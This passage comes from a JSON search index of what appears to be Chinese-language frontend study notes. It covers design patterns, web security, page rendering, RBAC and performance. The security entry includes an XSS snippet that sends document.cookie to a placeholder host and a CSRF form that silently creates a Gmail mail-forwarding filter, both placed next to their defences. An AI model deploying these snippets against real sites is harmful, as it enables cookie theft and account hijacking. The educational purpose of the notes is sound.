      "normalizedContent": "# 设计模式\n\n\n# 设计原则\n\n开放封闭原则是最重要的：对扩展开放，对修改封闭\n\n\n# 1、工厂模式\n\nclass foo { \n}\n\nfunction factory(): foo {\n    return new foo(...arguments)\n}\n\n\n\n# 2、单例模式\n\n提供全局唯一的对象，无论获取多少次\n\nclass singleton {\n    public static instance:singleton|null = null\n    private constructor() {}\n    public static getinstance(): singleton {\n      //缓存instance\n      if(this.instance == null){\n        this.instance = new singleton()\n      }\n      return this.instance\n    }\n    fn1() {}\n    fn2() {}\n}\n\nconst s1 = new singleton() // error: constructor of 'singleton' is private\n\nconst s2 = singleton.getinstance()\ns2.fn1()\ns2.fn2()\n\nconst s3 = singleton.getinstance()\ns2 === s3 // true\n\n\n应用场景\n\n * vuex redux 的 store ，全局唯一的\n * 全局唯一的 dialog modal\n\n\n# 3、代理模式\n\n使用者不能直接访问真实数据，而是通过一个代理层来访问。 es proxy 本身就是代理模式，vue3 基于它来实现响应式\n\n应用场景\n\n * vue3的proxy\n\n\n# 4、观察者模式\n\n即常说的绑定事件。一个主题，一个观察者，主题变化之后触发观察者执行。\n\n// 一个主题，一个观察者，主题变化之后触发观察者执行\nbtn.addeventlistener('click', () => { ... })\n\n\n场景:\n\n * vue响应式原理\n\n\n# 5、发布订阅模式\n\n即常说的自定义事件，一个 event 对象，可以绑定事件，可以触发事件 vue中的事件总线传参\n\n// 绑定\nevent.on('event-key', () => {\n    // 事件1\n})\nevent.on('event-key', () => {\n    // 事件2\n})\n\n// 触发执行\nevent.emit('event-key')\n\n\n\n# 6、装饰器模式\n\nes 和 ts 的 decorator 语法就是装饰器模式。可以为 class 和 method 增加新的功能。\n\nvue+ts的代码中用的就是装饰器模式\n\nimport { vue, prop,emit ,component} from 'vue-property-decorator'\n@component({\n  components: {\n    helloworld\n  }\n})\nclass demo extends vue {\n  @prop({ required: true, type: string }) msg\n  @emit('custom')\n  @provide() msg = this.msg\n  msg:string = 'this is decorator'\n}\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "webpack 优化",
      "frontmatter": {},
      "regularPath": "/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/webpack%20%E4%BC%98%E5%8C%96.html",
      "relativePath": "webstudy/工程化/webpack 优化.md",
      "key": "v-211dc1b3",
      "path": "/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/webpack%20%E4%BC%98%E5%8C%96.html",
      "headersStr": null,
      "content": "# webpack 优化\n\nwebpack 优化",
      "normalizedContent": "# webpack 优化\n\nwebpack 优化",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "安全",
      "frontmatter": {
        "title": "安全"
      },
      "regularPath": "/webstudy/%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/%E5%AE%89%E5%85%A8.html",
      "relativePath": "webstudy/运行环境/安全.md",
      "key": "v-3eb3b24c",
      "path": "/webstudy/%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/%E5%AE%89%E5%85%A8.html",
      "headers": [
        {
          "level": 2,
          "title": "网络安全攻击",
          "slug": "网络安全攻击",
          "normalizedTitle": "网络安全攻击",
          "charIndex": 9
        },
        {
          "level": 3,
          "title": "XSS",
          "slug": "xss",
          "normalizedTitle": "xss",
          "charIndex": 20
        },
        {
          "level": 3,
          "title": "CSRF",
          "slug": "csrf",
          "normalizedTitle": "csrf",
          "charIndex": 54
        },
        {
          "level": 3,
          "title": "点击劫持 Clickjacking",
          "slug": "点击劫持-clickjacking",
          "normalizedTitle": "点击劫持 clickjacking",
          "charIndex": 1785
        },
        {
          "level": 3,
          "title": "## SQL 注入",
          "slug": "sql-注入",
          "normalizedTitle": "## sql 注入",
          "charIndex": 2130
        }
      ],
      "headersStr": "网络安全攻击 XSS CSRF 点击劫持 Clickjacking ## SQL 注入",
      "content": "# 安全\n\n\n# 网络安全攻击\n\n * XSSCross Site Scripting 跨站脚本攻击\n * CSRFCross-site request forgery 跨站请求伪造\n * 点击劫持\n\n\n# XSS\n\nXSS(Cross Site Scripting跨站脚本)。XSS定义的主语是“脚本”，是一种跨站执行的脚本，也就是javascript脚本，指的是在网站上注入我们的javascript脚本，执行非法操作。 比如input框，文本编辑器输入一些内容\n\n# 场景\n\n<script>\n  var img = document.createElement('img')\n  img.src = 'http://xxx.com/api/xxx?info=' + document.cookie \n  //执行此代码，就会将攻击的cookie提交到自己制定的服务器中\n</script>\n\n\n# 解决\n\n * 替换字符串\n\nconst newStr = str.replaceAll('<', '&lt;').replaceAll('>', '&gt;')\n\n\n * 借助第三方工具 https://www.npmjs.com/package/xss\n\n# Vue和React默认已屏蔽Xss攻击\n\n但下面的场景会开启\n\n * Vue v-html\n * React dangerouslySetInnerHTML\n\n\n# CSRF\n\nCSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。CSRF定义的主语是”请求“，是一种跨站的伪造的请求，指的是跨站伪造用户的请求，模拟用户的操作\n\n# 场景\n\n请看下面的故事\n\n * 小明登录了 Gmail 邮箱，收到一封广告邮件 “转让比特币，只要 998”\n * 小明抱着好奇的心态点开看了看，发现是个空白页面，就关闭了 但此时，攻击已经完成了。黑客在这个空白页面设置了 js 代码，会让小明的邮件都转发到 hacker@hackermail.com 。\n   因为小明已经登录了 Gmail ，有了 Gmail 的 cookie 。所以再去请求 Gmail API 就会带着 cookie ，就有可能成功。\n\n<form method=\"POST\" action=\"https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf\" enctype=\"multipart/form-data\"> \n    <input type=\"hidden\" name=\"cf2_emc\" value=\"true\"/> \n    <input type=\"hidden\" name=\"cf2_email\" value=\"hacker@hakermail.com\"/> \n    .....\n    <input type=\"hidden\" name=\"irf\" value=\"on\"/> \n    <input type=\"hidden\" name=\"nvp_bu_cftb\" value=\"Create Filter\"/> \n</form> \n<script> \n    document.forms[0].submit();\n\n    // PS：有些是 post 请求，有些是 get 请求\n    //     get 请求如果用 img.src 还可以规避跨域，更加危险\n</script>\n\n\n# CSRF 的过程\n\n * 用户登录了 a.com ，有了 cookie\n * 黑客引诱用户访问 b.com 网页，并在其中发起一个跨站请求 a.com/api/xxx\n * a.com API 收到 cookie ，误以为是真实用户的请求，就受理了\n\n# 解决cookie跨域\n\n * 严格的跨域请求限制\n * 为 cookie 设置 SameSite 不随跨域请求被发送 Set-Cookie: key1=val1; key2=val2; SameSite=Strict;\n * 关键接口使用短信验证码等双重验证\n\n\n# 点击劫持 Clickjacking\n\n点击劫持的原理：黑客在自己的网站，使用隐藏的 <iframe> 嵌入其他网页，诱导用户按顺序点击。\n\n钓鱼网站\n\n使用 JS 预防\n\nif (top.location.hostname !== self.location.hostname) {\n    alert(\"您正在访问不安全的页面，即将跳转到安全页面！\")\n    top.location.href = self.location.href\n}\n\n\n# 解决\n\n增加 http header X-Frame-Options:SAMEORIGIN ，让 <iframe> 只能加载同域名的网页。\n\nPS：点击劫持，攻击那些需要用户点击操作的行为。CSRF 不需要用户知道，偷偷完成。\n\n\n# ## SQL 注入",
      "normalizedContent": "# 安全\n\n\n# 网络安全攻击\n\n * xsscross site scripting 跨站脚本攻击\n * csrfcross-site request forgery 跨站请求伪造\n * 点击劫持\n\n\n# xss\n\nxss(cross site scripting跨站脚本)。xss定义的主语是“脚本”，是一种跨站执行的脚本，也就是javascript脚本，指的是在网站上注入我们的javascript脚本，执行非法操作。 比如input框，文本编辑器输入一些内容\n\n# 场景\n\n<script>\n  var img = document.createelement('img')\n  img.src = 'http://xxx.com/api/xxx?info=' + document.cookie \n  //执行此代码，就会将攻击的cookie提交到自己制定的服务器中\n</script>\n\n\n# 解决\n\n * 替换字符串\n\nconst newstr = str.replaceall('<', '&lt;').replaceall('>', '&gt;')\n\n\n * 借助第三方工具 https://www.npmjs.com/package/xss\n\n# vue和react默认已屏蔽xss攻击\n\n但下面的场景会开启\n\n * vue v-html\n * react dangerouslysetinnerhtml\n\n\n# csrf\n\ncsrf（cross-site request forgery跨站请求伪造，也被称为“one click attack”或者session riding，通常缩写为csrf或者xsrf，是一种对网站的恶意利用。csrf定义的主语是”请求“，是一种跨站的伪造的请求，指的是跨站伪造用户的请求，模拟用户的操作\n\n# 场景\n\n请看下面的故事\n\n * 小明登录了 gmail 邮箱，收到一封广告邮件 “转让比特币，只要 998”\n * 小明抱着好奇的心态点开看了看，发现是个空白页面，就关闭了 但此时，攻击已经完成了。黑客在这个空白页面设置了 js 代码，会让小明的邮件都转发到 hacker@hackermail.com 。\n   因为小明已经登录了 gmail ，有了 gmail 的 cookie 。所以再去请求 gmail api 就会带着 cookie ，就有可能成功。\n\n<form method=\"post\" action=\"https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf\" enctype=\"multipart/form-data\"> \n    <input type=\"hidden\" name=\"cf2_emc\" value=\"true\"/> \n    <input type=\"hidden\" name=\"cf2_email\" value=\"hacker@hakermail.com\"/> \n    .....\n    <input type=\"hidden\" name=\"irf\" value=\"on\"/> \n    <input type=\"hidden\" name=\"nvp_bu_cftb\" value=\"create filter\"/> \n</form> \n<script> \n    document.forms[0].submit();\n\n    // ps：有些是 post 请求，有些是 get 请求\n    //     get 请求如果用 img.src 还可以规避跨域，更加危险\n</script>\n\n\n# csrf 的过程\n\n * 用户登录了 a.com ，有了 cookie\n * 黑客引诱用户访问 b.com 网页，并在其中发起一个跨站请求 a.com/api/xxx\n * a.com api 收到 cookie ，误以为是真实用户的请求，就受理了\n\n# 解决cookie跨域\n\n * 严格的跨域请求限制\n * 为 cookie 设置 samesite 不随跨域请求被发送 set-cookie: key1=val1; key2=val2; samesite=strict;\n * 关键接口使用短信验证码等双重验证\n\n\n# 点击劫持 clickjacking\n\n点击劫持的原理：黑客在自己的网站，使用隐藏的 <iframe> 嵌入其他网页，诱导用户按顺序点击。\n\n钓鱼网站\n\n使用 js 预防\n\nif (top.location.hostname !== self.location.hostname) {\n    alert(\"您正在访问不安全的页面，即将跳转到安全页面！\")\n    top.location.href = self.location.href\n}\n\n\n# 解决\n\n增加 http header x-frame-options:sameorigin ，让 <iframe> 只能加载同域名的网页。\n\nps：点击劫持，攻击那些需要用户点击操作的行为。csrf 不需要用户知道，偷偷完成。\n\n\n# ## sql 注入",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "网页的加载和渲染",
      "frontmatter": {
        "title": "网页的加载和渲染"
      },
      "regularPath": "/webstudy/%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/%E7%BD%91%E9%A1%B5%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%B8%B2%E6%9F%93.html",
      "relativePath": "webstudy/运行环境/网页的加载和渲染.md",
      "key": "v-47ace465",
      "path": "/webstudy/%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/%E7%BD%91%E9%A1%B5%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%B8%B2%E6%9F%93.html",
      "headers": [
        {
          "level": 2,
          "title": "运行环境",
          "slug": "运行环境",
          "normalizedTitle": "运行环境",
          "charIndex": 2
        },
        {
          "level": 2,
          "title": "网页加载过程",
          "slug": "网页加载过程",
          "normalizedTitle": "网页加载过程",
          "charIndex": 28
        },
        {
          "level": 3,
          "title": "加载的资源类型",
          "slug": "加载的资源类型",
          "normalizedTitle": "加载的资源类型",
          "charIndex": 69
        },
        {
          "level": 3,
          "title": "加载过程",
          "slug": "加载过程",
          "normalizedTitle": "加载过程",
          "charIndex": 30
        },
        {
          "level": 3,
          "title": "渲染过程",
          "slug": "渲染过程",
          "normalizedTitle": "渲染过程",
          "charIndex": 793
        },
        {
          "level": 3,
          "title": "重排和重绘",
          "slug": "重排和重绘",
          "normalizedTitle": "重排和重绘",
          "charIndex": 1216
        },
        {
          "level": 3,
          "title": "触发 css BFC 的条件",
          "slug": "触发-css-bfc-的条件",
          "normalizedTitle": "触发 css bfc 的条件",
          "charIndex": 2133
        }
      ],
      "headersStr": "运行环境 网页加载过程 加载的资源类型 加载过程 渲染过程 重排和重绘 触发 css BFC 的条件",
      "content": "# 运行环境\n\n * 前端代码运行环境及浏览器\n\n\n# 网页加载过程\n\n从输入url到渲染出整个页面的过程这里主要考虑前端关注点\n\n\n# 加载的资源类型\n\n * html\n * 媒体文件：图片、视频等\n * js css\n\n\n# 加载过程\n\n * DNS解析(domain name server):将域名解析为ip地址\n * 浏览器根据ip地址向服务器发送请求\n * 服务器处理http请求，并返回给浏览器\n\n# 过于详细的过程(TCP连接)\n\n * 1.域名解析\n * 2.TCP连接 HTTP协议是使用TCP协议作为其传输层协议的，在拿到服务器的IP地址后，浏览器客户端会与服务器建立TCP连接。该过程包括三次握手： 第一次握手：建立连接时，客户端向服务端发送请求报文 第二次握手：服务器收到请求报文后，如同意连接，则向客户端发送确认报文 第三次握手，客户端收到服务器的确认后，再次向服务器给出确认报文，完成连接。 三次握手主要是为了防止已经失效的请求报文字段发送给服务器，浪费资源。\n * 3.浏览器发送HTTP请求 浏览器构建http请求报文，并通过TCP协议传送到服务器的指定端口。http请求报文一共包括三个部分： 请求行：指定http请求的方法、url、http协议版本等 请求头：描述浏览器的相关信息，语言、编码等。 请求正文：当发送POST, PUT等请求时，通常需要向服务器传递数据。这些数据就储存在请求正文中。\n * 4、服务器处理HTTP请求 服务器处理http请求，并返回响应报文。响应报文包括三个部分： 响应头：包含了响应的相关信息，如日期等 响应正文：服务器返回给浏览器的文本信息，通常的html、js、css、图片等就包含在这一部分里面。\n * 5、浏览器页面渲染 浏览器接受到http服务器发送过来的响应报文，并开始解析html文档，渲染页面。具体的渲染过程包括：构建DOM树、构建渲染树、定位页面元素、绘制页面元素等。\n * 6、断开TCP连接 客户端与服务器四次挥手，断开tcp连接。 第一次挥手：客户端想分手，发送消息给服务器 第二次挥手：服务器通知客户端已经接受到分手请求，但还没做好分手准备 第三次回收：服务器已经做好分手准备，通知客户端 第四次挥手：客户端发送消息给服务器，确定分手，服务器关闭连接\n\n\n# 渲染过程\n\n * 根据html代码生成Dom Tree\n * 根据css代码生产CSSOM(css object model)\n * 将DOM Tree和CSSOM整合形成Render Tree\n * 通过Render Tree渲染页面\n * 遇到 <script>则暂停渲染，先执行js代码，执行完成之后在继续\n * render tree渲染完成\n\n# js进程和渲染进程是同一进程\n\njs可能会改变dom结构，所以说遇到js先执行js，执行之后再继续渲染dom\n\n\n# 重排和重绘\n\n * 重绘：CSS 样式改变(例如：visibility，背景色的改变)，使浏览器需要根据新的属性进行绘制。\n * 重排：我们对DOM的修改引发了DOM几何元素的变化，渲染树需要重新计算，重新生成布局，重新排列元素。\n\n> 重绘不一定导致重排，但重排一定会导致重绘\n\n# 重排的原因\n\n当DOM的变化影响了元素的几何信息(元素的的位置和尺寸大小)，浏览器需要重新计算元素的几何属性，就会发生重排\n\n * 页面初始渲染就是一次重排\n * 添加/删除可见的DOM元素\n * 改变元素位置，改变元素尺寸，比如边距、填充、边框、宽度和高度等\n * 改变浏览器窗口尺寸，比如resize事件发生时\n * 激活CSS伪类（例如：:hover）\n * 设置 style 属性的值，因为通过设置style属性改变结点样式的话，每一次设置都会触发一次reflow\n * 查询某些属性或调用某些计算方法：offsetWidth、offsetHeight等\n\n# 优化重排\n\n * 集中修改样式，或直接使用 class\n * DOM 操作前先使用 display: none,absolute 或 fixed 脱离文档流\n * 使用 BFC ，不影响外部的元素\n * 对于频繁触发的操作（resize scroll 等）使用节流和防抖\n * 使用 createDocumentFragment 进行批量 DOM 操作\n * 优化动画，如使用 requestAnimationFrame 或者 CSS3（可启用 GPU 加速）\n\n//强制刷新 触发两次重排\ndiv.style.left = div.offsetLeft + 1 + 'px';\ndiv.style.top = div.offsetTop + 1 + 'px';\n//优化\n//缓存布局信息 相当于读写分离\nvar curLeft = div.offsetLeft;\nvar curTop = div.offsetTop;\ndiv.style.left = curLeft + 1 + 'px';\ndiv.style.top = curTop + 1 + 'px';\n\n\n\n# 触发 css BFC 的条件\n\nBFC - Block Formatting Context 块格式化上下文\n\n * 根节点 html\n * 设置 float left right\n * 设置 overflow auto scroll hidden\n * 设置 display inline-block table table-cell flex grid\n * 设置 position absolute fixed",
      "normalizedContent": "# 运行环境\n\n * 前端代码运行环境及浏览器\n\n\n# 网页加载过程\n\n从输入url到渲染出整个页面的过程这里主要考虑前端关注点\n\n\n# 加载的资源类型\n\n * html\n * 媒体文件：图片、视频等\n * js css\n\n\n# 加载过程\n\n * dns解析(domain name server):将域名解析为ip地址\n * 浏览器根据ip地址向服务器发送请求\n * 服务器处理http请求，并返回给浏览器\n\n# 过于详细的过程(tcp连接)\n\n * 1.域名解析\n * 2.tcp连接 http协议是使用tcp协议作为其传输层协议的，在拿到服务器的ip地址后，浏览器客户端会与服务器建立tcp连接。该过程包括三次握手： 第一次握手：建立连接时，客户端向服务端发送请求报文 第二次握手：服务器收到请求报文后，如同意连接，则向客户端发送确认报文 第三次握手，客户端收到服务器的确认后，再次向服务器给出确认报文，完成连接。 三次握手主要是为了防止已经失效的请求报文字段发送给服务器，浪费资源。\n * 3.浏览器发送http请求 浏览器构建http请求报文，并通过tcp协议传送到服务器的指定端口。http请求报文一共包括三个部分： 请求行：指定http请求的方法、url、http协议版本等 请求头：描述浏览器的相关信息，语言、编码等。 请求正文：当发送post, put等请求时，通常需要向服务器传递数据。这些数据就储存在请求正文中。\n * 4、服务器处理http请求 服务器处理http请求，并返回响应报文。响应报文包括三个部分： 响应头：包含了响应的相关信息，如日期等 响应正文：服务器返回给浏览器的文本信息，通常的html、js、css、图片等就包含在这一部分里面。\n * 5、浏览器页面渲染 浏览器接受到http服务器发送过来的响应报文，并开始解析html文档，渲染页面。具体的渲染过程包括：构建dom树、构建渲染树、定位页面元素、绘制页面元素等。\n * 6、断开tcp连接 客户端与服务器四次挥手，断开tcp连接。 第一次挥手：客户端想分手，发送消息给服务器 第二次挥手：服务器通知客户端已经接受到分手请求，但还没做好分手准备 第三次回收：服务器已经做好分手准备，通知客户端 第四次挥手：客户端发送消息给服务器，确定分手，服务器关闭连接\n\n\n# 渲染过程\n\n * 根据html代码生成dom tree\n * 根据css代码生产cssom(css object model)\n * 将dom tree和cssom整合形成render tree\n * 通过render tree渲染页面\n * 遇到 <script>则暂停渲染，先执行js代码，执行完成之后在继续\n * render tree渲染完成\n\n# js进程和渲染进程是同一进程\n\njs可能会改变dom结构，所以说遇到js先执行js，执行之后再继续渲染dom\n\n\n# 重排和重绘\n\n * 重绘：css 样式改变(例如：visibility，背景色的改变)，使浏览器需要根据新的属性进行绘制。\n * 重排：我们对dom的修改引发了dom几何元素的变化，渲染树需要重新计算，重新生成布局，重新排列元素。\n\n> 重绘不一定导致重排，但重排一定会导致重绘\n\n# 重排的原因\n\n当dom的变化影响了元素的几何信息(元素的的位置和尺寸大小)，浏览器需要重新计算元素的几何属性，就会发生重排\n\n * 页面初始渲染就是一次重排\n * 添加/删除可见的dom元素\n * 改变元素位置，改变元素尺寸，比如边距、填充、边框、宽度和高度等\n * 改变浏览器窗口尺寸，比如resize事件发生时\n * 激活css伪类（例如：:hover）\n * 设置 style 属性的值，因为通过设置style属性改变结点样式的话，每一次设置都会触发一次reflow\n * 查询某些属性或调用某些计算方法：offsetwidth、offsetheight等\n\n# 优化重排\n\n * 集中修改样式，或直接使用 class\n * dom 操作前先使用 display: none,absolute 或 fixed 脱离文档流\n * 使用 bfc ，不影响外部的元素\n * 对于频繁触发的操作（resize scroll 等）使用节流和防抖\n * 使用 createdocumentfragment 进行批量 dom 操作\n * 优化动画，如使用 requestanimationframe 或者 css3（可启用 gpu 加速）\n\n//强制刷新 触发两次重排\ndiv.style.left = div.offsetleft + 1 + 'px';\ndiv.style.top = div.offsettop + 1 + 'px';\n//优化\n//缓存布局信息 相当于读写分离\nvar curleft = div.offsetleft;\nvar curtop = div.offsettop;\ndiv.style.left = curleft + 1 + 'px';\ndiv.style.top = curtop + 1 + 'px';\n\n\n\n# 触发 css bfc 的条件\n\nbfc - block formatting context 块格式化上下文\n\n * 根节点 html\n * 设置 float left right\n * 设置 overflow auto scroll hidden\n * 设置 display inline-block table table-cell flex grid\n * 设置 position absolute fixed",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "权限设计",
      "frontmatter": {
        "title": "权限设计"
      },
      "regularPath": "/webstudy/%E9%A1%B9%E7%9B%AE/%E6%9D%83%E9%99%90%E8%AE%BE%E8%AE%A1.html",
      "relativePath": "webstudy/项目/权限设计.md",
      "key": "v-5dce9a2e",
      "path": "/webstudy/%E9%A1%B9%E7%9B%AE/%E6%9D%83%E9%99%90%E8%AE%BE%E8%AE%A1.html",
      "headers": [
        {
          "level": 2,
          "title": "RBAC模型",
          "slug": "rbac模型",
          "normalizedTitle": "rbac模型",
          "charIndex": 34
        }
      ],
      "headersStr": "RBAC模型",
      "content": "# 权限设计\n\n如何设计一个基础的 用户-角色-权限 模型\n\n\n# RBAC模型\n\nRole-based access control 基于角色的访问控制。它可以满足我们绝大部分管理系统的管理权限控制。\n\n * 三个模型\n   * 用户\n   * 角色\n   * 权限\n * 两个关系（以角色为“轴”）\n   * 角色 - 用户\n   * 角色 - 权限\n\n角色:产品经理，开发负责人，开发人员，测试负责人，版本经理，测试人员，运维负责人... 权限:页面的权限，操作按钮的权限",
      "normalizedContent": "# 权限设计\n\n如何设计一个基础的 用户-角色-权限 模型\n\n\n# rbac模型\n\nrole-based access control 基于角色的访问控制。它可以满足我们绝大部分管理系统的管理权限控制。\n\n * 三个模型\n   * 用户\n   * 角色\n   * 权限\n * 两个关系（以角色为“轴”）\n   * 角色 - 用户\n   * 角色 - 权限\n\n角色:产品经理，开发负责人，开发人员，测试负责人，版本经理，测试人员，运维负责人... 权限:页面的权限，操作按钮的权限",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "前端工程化",
      "frontmatter": {
        "title": "前端工程化"
      },
      "regularPath": "/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96.html",
      "relativePath": "webstudy/工程化/前端工程化.md",
      "key": "v-2725f445",
      "path": "/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96.html",
      "headers": [
        {
          "level": 2,
          "title": "前端工程化",
          "slug": "前端工程化",
          "normalizedTitle": "前端工程化",
          "charIndex": 2
        }
      ],
      "headersStr": "前端工程化",
      "content": "# 前端工程化",
      "normalizedContent": "# 前端工程化",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "简介",
      "frontmatter": {
        "title": "简介"
      },
      "regularPath": "/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E7%AE%80%E4%BB%8B.html",
      "relativePath": "dataStructure/树简介/简介.md",
      "key": "v-481f32c4",
      "path": "/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E7%AE%80%E4%BB%8B.html",
      "headers": [
        {
          "level": 3,
          "title": "树",
          "slug": "树",
          "normalizedTitle": "树",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "树结构",
          "slug": "树结构",
          "normalizedTitle": "树结构",
          "charIndex": 126
        }
      ],
      "headersStr": "树 树结构",
      "content": "# 树\n\n树是用来模拟具有树状结构性质的数据集合。根据它的特性可以分为非常多的种类，对于我们来讲，掌握二叉树这种结构就足够了，它也是树最简单、应用最广泛的种类。\n\n> 二叉树是一种典型的树树状结构。如它名字所描述的那样，二叉树是每个节点最多有两个子树的树结构，通常子树被称作“左子树”和“右子树”。\n\n\n\n\n# 树结构\n\n * 多叉树： 例如：DOM 结构\n\n<div>\n  <span></span>\n  <span></span>\n  <span></span>\n  <span></span>\n</div>\n\n\n * 二叉树(最常见):\n\nconst tree = {\n  val: \"a\",\n  children: [\n    {\n      val: \"b\",\n      children: [\n        { val: \"d\", children: [] },\n        { val: \"e\", children: [] },\n      ],\n    },\n    {\n      val: \"c\",\n      children: [\n        { val: \"f\", children: [] },\n        { val: \"g\", children: [] },\n      ],\n    },\n  ],\n};\n",
      "normalizedContent": "# 树\n\n树是用来模拟具有树状结构性质的数据集合。根据它的特性可以分为非常多的种类，对于我们来讲，掌握二叉树这种结构就足够了，它也是树最简单、应用最广泛的种类。\n\n> 二叉树是一种典型的树树状结构。如它名字所描述的那样，二叉树是每个节点最多有两个子树的树结构，通常子树被称作“左子树”和“右子树”。\n\n\n\n\n# 树结构\n\n * 多叉树： 例如：dom 结构\n\n<div>\n  <span></span>\n  <span></span>\n  <span></span>\n  <span></span>\n</div>\n\n\n * 二叉树(最常见):\n\nconst tree = {\n  val: \"a\",\n  children: [\n    {\n      val: \"b\",\n      children: [\n        { val: \"d\", children: [] },\n        { val: \"e\", children: [] },\n      ],\n    },\n    {\n      val: \"c\",\n      children: [\n        { val: \"f\", children: [] },\n        { val: \"g\", children: [] },\n      ],\n    },\n  ],\n};\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "性能优化",
      "frontmatter": {
        "title": "性能优化"
      },
      "regularPath": "/webstudy/%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html",
      "relativePath": "webstudy/运行环境/性能优化.md",
      "key": "v-f3eb5e7c",
      "path": "/webstudy/%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html",
      "headers": [
        {
          "level": 2,
          "title": "前端通用的优化策略",
          "slug": "前端通用的优化策略",
          "normalizedTitle": "前端通用的优化策略",
          "charIndex": 11
        },
        {
          "level": 2,
          "title": "性能优化的原则",
          "slug": "性能优化的原则",
          "normalizedTitle": "性能优化的原则",
          "charIndex": 49
        },
        {
          "level": 2,
          "title": "思路",
          "slug": "思路",
          "normalizedTitle": "思路",
          "charIndex": 106
        },
        {
          "level": 3,
          "title": "1、让加载更快",
          "slug": "_1、让加载更快",
          "normalizedTitle": "1、让加载更快",
          "charIndex": 113
        },
        {
          "level": 3,
          "title": "2、让渲染更快",
          "slug": "_2、让渲染更快",
          "normalizedTitle": "2、让渲染更快",
          "charIndex": 246
        },
        {
          "level": 2,
          "title": "体验优化",
          "slug": "体验优化",
          "normalizedTitle": "体验优化",
          "charIndex": 371
        }
      ],
      "headersStr": "前端通用的优化策略 性能优化的原则 思路 1、让加载更快 2、让渲染更快 体验优化",
      "content": "# 性能优化\n\n\n# 前端通用的优化策略\n\n压缩资源，使用 CDN ，http 缓存等。\n\n\n# 性能优化的原则\n\n * 多使用内存、缓存等方式（用空间换时间）\n * 减少cpu计算量，减少网络加载耗时\n\n\n# 思路\n\n\n# 1、让加载更快\n\n * 减少资源体积:js，css，图片通过webpack打包...服务器端的gzip压缩，浏览器解压解析...\n\n * 减少访问次数:合并代码(webpack打包成bundle文件)、SSR服务端渲染、缓存\n\n * 使用更快的网路:CDN\n\n\n# 2、让渲染更快\n\n * css放在head中,js放在body最下面\n * 尽早执行js代码，使用DOMContentLoaded触发\n * 懒加载\n * 对DOM查询进行缓存，频繁的DOM操作合并到一起插入DOM结构(也就是避免网页重排)\n\n\n# 体验优化\n\n * 骨架屏",
      "normalizedContent": "# 性能优化\n\n\n# 前端通用的优化策略\n\n压缩资源，使用 cdn ，http 缓存等。\n\n\n# 性能优化的原则\n\n * 多使用内存、缓存等方式（用空间换时间）\n * 减少cpu计算量，减少网络加载耗时\n\n\n# 思路\n\n\n# 1、让加载更快\n\n * 减少资源体积:js，css，图片通过webpack打包...服务器端的gzip压缩，浏览器解压解析...\n\n * 减少访问次数:合并代码(webpack打包成bundle文件)、ssr服务端渲染、缓存\n\n * 使用更快的网路:cdn\n\n\n# 2、让渲染更快\n\n * css放在head中,js放在body最下面\n * 尽早执行js代码，使用domcontentloaded触发\n * 懒加载\n * 对dom查询进行缓存，频繁的dom操作合并到一起插入dom结构(也就是避免网页重排)\n\n\n# 体验优化\n\n * 骨架屏",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "微前端",
      "frontmatter": {
        "title": "微前端"
      },
      "regularPath": "/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/%E5%BE%AE%E5%89%8D%E7%AB%AF.html",
      "relativePath": "webstudy/工程化/微前端.md",
      "key": "v-3e82da48",
      "path": "/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/%E5%BE%AE%E5%89%8D%E7%AB%AF.html",
      "headers": [
        {
          "level": 2,
          "title": "微前端",
          "slug": "微前端",
          "normalizedTitle": "微前端",
          "charIndex": 2
        }
      ],
      "headersStr": "微前端",
      "content": "# 微前端\n\n[我终于把微前端(qiankun)落地生产项目了-来自于掘金]https://juejin.cn/post/7114589692560932878",
      "normalizedContent": "# 微前端\n\n[我终于把微前端(qiankun)落地生产项目了-来自于掘金]https://juejin.cn/post/7114589692560932878",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "Vue生命周期",
      "frontmatter": {
        "title": "Vue生命周期"
      },
      "regularPath": "/webstudy/Vue2/Vue%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.html",
      "relativePath": "webstudy/Vue2/Vue生命周期.md",
      "key": "v-7ee75026",
      "path": "/webstudy/Vue2/Vue%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.html",
      "headers": [
        {
          "level": 2,
          "title": "每个钩子都做了什么",
          "slug": "每个钩子都做了什么",
          "normalizedTitle": "每个钩子都做了什么",
          "charIndex": 14
        },
        {
          "level": 2,
          "title": "Vue3和Vue2比较",
          "slug": "vue3和vue2比较",
          "normalizedTitle": "vue3和vue2比较",
          "charIndex": 373
        },
        {
          "level": 2,
          "title": "父子组件生命周期顺序",
